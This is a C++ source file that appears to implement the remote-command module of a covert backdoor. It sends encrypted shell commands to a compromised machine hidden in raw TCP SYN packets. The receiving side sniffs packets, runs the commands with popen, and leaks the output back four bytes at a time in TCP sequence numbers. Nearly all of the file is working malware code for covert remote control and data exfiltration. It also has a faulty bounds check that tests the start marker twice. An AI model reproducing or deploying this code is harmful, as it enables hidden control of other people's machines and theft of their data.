#include "RemoteCodeExecuter.h"

#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <iostream>

#define CMD_START_STR "s-start["
#define CMD_STOP_STR "]s-end"

/*
 * Sends a command to a compromised machine.
 *
 * Params:
 *      NetworkEngine *net: The network engine to use to send the command.
 *
 *      const struct in_addr daddr: The address of the compromised machine.
 *
 *      const std::string &cmd: The UNIX command to execute on the remote machine.
 */
int RemoteCodeExecuter::sendCommand(NetworkEngine *net, const struct in_addr daddr,
                                    const std::string &cmd) {
    unsigned short sport;
    unsigned short dport;
    unsigned int seq;
    unsigned int ack;

    // generate signature
    sport = (Crypto::rand() % 55535) + 10000;
    dport = authenticator::generateSignature(sport);
    seq = Crypto::rand();
    ack = Crypto::rand();

    // convert command to payload
    std::string tmp;
    tmp += CMD_START_STR;
    tmp += cmd;
    tmp += CMD_STOP_STR;
    UCharVector payload(tmp.begin(), tmp.end());

    // encrypt
    UCharVector ciphertext = net->getCrypto()->enc(payload);

    // send
    return net->sendRawTcp(*net->getIp(), daddr, sport, dport, seq, ack,
                           TcpStack::SYN_FLAG | TcpStack::CWR_FLAG, ciphertext);
}

/*
 * The PCAP callback function that handles the any packet related to the remote code execution
 * protocol.
 *
 * Params:
 *      const pcap_pkthdr *header: The PCAP header structure.
 *
 *      const unsigned char *packet: The incoming packet.
 *
 *      NetworkEngine *net: The network engine.
 */
void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned char *packet,
                                     NetworkEngine *net) {
    struct ethhdr *eth = (struct ethhdr *)packet;
    struct iphdr *ip;
    struct tcphdr *tcp;

    // is it from same machine?
    if (net->isFromThisMachine(eth)) {
        return;
    }

    // is it ip?
    if (!net->isIp(eth)) {
        return;
    }

    // is it tcp?
    ip = (struct iphdr *)(packet + ETH_HLEN);
    if (!net->isTcp(ip)) {
        return;
    }

    tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));

    // is it authenticated?
    if (!net->isAuth(tcp)) {
        return;
    }

    // get payload
    unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
    unsigned int payloadSize = header->len - ETH_HLEN - (ip->ihl * 4) - (tcp->doff * 4);

    // if command execute it
    if (tcp->syn && tcp->cwr) {
        // decrypt
        UCharVector ciphertext{};
        ciphertext.assign(payload, payload + payloadSize);
        UCharVector plaintextBuff = net->getCrypto()->dec(ciphertext);
        std::string plaintext((char *)plaintextBuff.data(), payloadSize);

        int cmdStartPos = plaintext.find(CMD_START_STR);
        int cmdStopPos = plaintext.find(CMD_STOP_STR);

        if (cmdStartPos == std::string::npos || cmdStartPos == std::string::npos) {
            return;
        }

        plaintext[cmdStopPos] = 0;

        executeCommand(net, ntohl(ip->saddr), &plaintext[strlen(CMD_START_STR)]);
    }

    // if it is a response print it
    if (tcp->syn && tcp->ece) {
        // convert the sequence number to a null terminated string and print it
        char seqBuffer[5];
        unsigned int seqNum = ntohl(tcp->seq);
        memcpy(seqBuffer, (unsigned char *)&seqNum, 4);
        seqBuffer[4] = 0;
        std::cout << seqBuffer;
    }
}

/*
 * Executes a command and then sends the results over the network with a covert channel.
 *
 * Params:
 *      NetworkEngine *net: The network engine to use.
 *
 *      const unsigned int daddr: The host to send the packet too.
 *
 *      const char *cmd: The command the execute.
 */
void RemoteCodeExecuter::executeCommand(NetworkEngine *net, const unsigned int daddr,
                                        const char *cmd) {
    struct in_addr daddrIn;
    daddrIn.s_addr = daddr;

    unsigned short sport;
    unsigned short dport;
    unsigned int ack;
    unsigned int *seq;
    FILE *fp;
    char lineBuffer[1000];
    int lineSize;

    UCharVector blank{};

    fp = popen(cmd, "r");

    memset(lineBuffer, 0, 1000);
    while (fgets(lineBuffer, 1000, fp)) {
        // calculate size to a multiple of 4
        lineSize = strlen(lineBuffer);
        if (lineSize % 4 != 0) {
            lineSize += 4 - (lineSize % 4);
        }

        // convert from c string to UCharVector
        std::string lineString(lineBuffer);
        UCharVector data(lineString.begin(), lineString.end());
        data.resize(lineSize, 0);

        // send as 4 bytes chunks stored in the sequence number
        for (int i = 0; i < data.size(); i += 4) {
            sport = (Crypto::rand() % 55535) + 10000;
            dport = authenticator::generateSignature(sport);

            ack = Crypto::rand();
            seq = (unsigned int *)(&data[i]);
            net->sendRawTcp(*net->getIp(), daddrIn, sport, dport, *seq, ack,
                            TcpStack::SYN_FLAG | TcpStack::ECE_FLAG, blank);
        }

        memset(lineBuffer, 0, 1000);
    }
}

